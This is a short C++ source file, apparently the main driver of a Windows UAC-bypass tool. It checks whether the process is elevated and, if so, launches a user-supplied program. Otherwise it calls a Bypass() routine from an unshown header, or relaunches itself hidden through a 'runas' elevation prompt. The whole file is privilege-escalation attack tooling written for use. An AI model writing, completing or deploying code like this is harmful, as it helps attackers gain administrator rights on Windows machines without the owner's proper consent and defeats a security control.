#include "Bypass.h"
#include <string>
#include <iostream>

int main() {
    if ((IsElevated()))
    {
        std::cout << "Target path: ";
        std::string path;
        std::getline(std::cin, path);
        std::cout << "Target Program: " << path << std::endl;
        char pathtofile[MAX_PATH];
        strcpy_s(pathtofile, MAX_PATH, path.c_str());

        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "open";
        sei.lpFile = pathtofile;
        sei.hwnd = NULL;
        sei.nShow = SW_SHOWNORMAL;
        sei.lpParameters = "/k";
        ShellExecuteExA(&sei);
        system("pause");
    }
    else {
        if (GetOSVersion())
            Bypass();
        else
        {
            char pathtofile[MAX_PATH];
            HMODULE GetModH = GetModuleHandleA(NULL);
            GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));

            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = pathtofile;
            sei.hwnd = NULL;
            sei.nShow = SW_HIDE;
            sei.lpParameters = NULL;
            ShellExecuteExA(&sei);
        }
        ExitProcess(0);
    }
}